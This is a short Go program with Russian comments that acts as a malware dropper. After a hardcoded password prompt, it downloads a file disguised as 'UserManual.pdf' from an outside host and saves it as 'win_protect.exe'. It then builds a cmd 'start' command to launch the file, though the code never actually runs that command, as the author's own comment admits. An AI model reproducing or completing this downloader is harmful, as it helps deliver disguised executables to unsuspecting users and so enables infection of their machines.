//Скачивает файл с сервера и переименовывает, надо разобраться как дать команду на запуск

package main

import (
	"io"
	"net/http"
	"os"
	"fmt"
	"os/exec"
)

func main() {
	fmt.Print("Введите пароль для закачки: ")
	var input string
	fmt.Scanln(&input)
	//fmt.Print(input)
	if input == "1597271" {
		axr()
	} else {
		fmt.Println("Неправильный пароль попробуйте снова")
	}
}

func axr() {
	fmt.Println("Закачали UserManual.pdf")
	fileUrl := "http://mrbean.online/dev646464/UserManual.pdf"
	err := DownloadFile("win_protect.exe", fileUrl)
	exec.Command("cmd", "/C", "start", "win_protect.exe")
	if err != nil {
		panic(err)
	}

}

// DownloadFile will download a url to a local file. It's efficient because it will
// write as it downloads and not load the whole file into memory.
func DownloadFile(filepath string, url string) error {
	fmt.Println("Сменили имя на win_protect.exe ")
	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	if err != nil {
		return err
	}

	return nil
}
